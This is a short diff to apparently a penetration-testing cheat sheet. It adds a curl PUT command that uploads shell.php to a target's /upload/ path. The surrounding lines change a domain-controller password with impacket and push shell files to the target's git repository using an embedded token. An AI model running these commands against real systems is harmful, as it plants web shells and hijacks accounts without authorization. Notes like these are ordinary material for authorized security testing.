@@ -181,6 +181,8 @@ impacket-changepasswd -debug -dc-ip $TARGET $DC/"$USERNAME":"$PASSWORD"@$TARGET 
 ## Git
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
+## curl - file upload (PUT)
+curl --upload-file shell.php http://$TARGET:80/upload/
 
 # Post Exploitation 
 
